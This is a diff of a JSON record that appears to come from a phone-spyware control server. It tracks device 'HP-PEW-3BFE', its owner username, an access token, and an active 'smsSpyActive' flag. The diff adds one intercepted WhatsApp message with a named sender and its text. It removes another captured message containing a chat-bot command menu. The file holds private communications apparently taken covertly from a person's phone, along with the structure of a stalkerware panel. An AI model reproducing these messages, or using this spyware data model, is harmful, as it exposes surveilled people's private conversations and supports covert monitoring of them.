@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776857355243,
+    "lastSeen": 1776857377763,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Muhammad Amal Ardhafan",
+        "content": "Semangat ma disana",
+        "time": "22/04 19:29",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776857356842
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -4011,14 +4019,6 @@
         "time": "22/04 15:09",
         "pkg": "com.whatsapp",
         "receivedAt": 1776841758054
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎7Sex Message (19 pesan): ~ Amsal",
-        "content": "┏  ◦  .apk query\n┃  ◦  .apkmod query\n┃  ◦  .applemusic query / link\n┃  ◦  .asupan username (optional)\n┃  ◦  .capcut link\n┃  ◦  .doump3 link\n┃  ◦  .douwm link\n┃  ◦  .douyin link\n┃  ◦  .download link\n┃  ◦  .fb link\n┃  ◦  .fetch link\n┃  ◦  .gdrive link\n┃  ◦  .hentai \n┃  ◦  .ig link\n┃  ◦  .igs link\n┃  ◦  .mediafire link\n┃  ◦  .pin link or query\n┃  ◦  .pixeldrain link\n┃  ◦  .play query\n┃  ◦  .quran surah ayat\n┃  ◦  .soundcloud query / link\n┃  ◦  .spotify query / link\n┃  ◦  .terabox link\n┃  ◦  .thcontent query\n┃  ◦  .threads link\n┃  ◦  .tikmp3 link\n┃  ◦  .tiktok link\n┃  ◦  .tikwm link\n┃  ◦  .ttcontent query\n┃  ◦  .twitter link\n┃  ◦  .video query\n┃  ◦  .videy link\n┃  ◦  .xnxx query / link\n┃  ◦  .ytlist link\n┃  ◦  .ytmp3 link\n┃  ◦  .ytmp4 link\n┃  ◦  .ytpost link\n┗  ◦  .ytsearch query",
-        "time": "22/04 15:09",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776841757848
       }
     ],
     "galleryPhotos": [],
